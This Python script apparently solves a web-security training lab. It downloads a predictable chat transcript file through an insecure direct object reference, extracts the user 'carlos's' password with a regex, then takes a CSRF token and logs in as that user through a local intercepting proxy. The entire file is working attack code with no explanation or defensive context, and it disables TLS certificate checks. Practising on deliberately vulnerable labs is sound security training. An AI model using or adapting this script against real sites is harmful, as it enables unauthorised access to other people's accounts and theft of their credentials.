import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
_doc_url = "download-transcript/1.txt"
_login_url = "login"

def retrive_user_password(session, url):
    chat_url = url + "/" + _doc_url
    response = session.get(chat_url, verify=False, proxies=_proxies)
    res = response.text
    if 'password' in res:
        print("(+) Found Carlos's Password...")
        carlos_password = re.findall(r'password is (.*)\.', res) #Regex For Get The Text Between (password is) & (.)
        #print(carlos_password)
        return carlos_password[0]
    else:
        print("(-) Could Not Find Carlos's Password.")
        sys.exit(-1)

def get_csrf_token(session, url):
    response = session.get(url, verify=False, proxies=_proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def user_login(session, url, password):
    login_url = url + "/" + _login_url
    csrf_token = get_csrf_token(session, login_url)

    print("(+) Logging in As The Carlos User...")
    data_login = {"username": "carlos", "password": password, "csrf": csrf_token}
    response = session.post(login_url, data=data_login, verify=False, proxies=_proxies)
    res = response.text
    #print(res)
    
    if "Log out" in res:
        print("(+) Successfully Logged in As The Carlos User.")
    else:
        print("(-) Could Not Login As The Carlos User.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    session = requests.Session()
    url = sys.argv[1]
    user_password = retrive_user_password(session, url)

    print("(+) Logging into Carlos's Account...")
    user_login(session, url, user_password)

if __name__ == "__main__":
    main()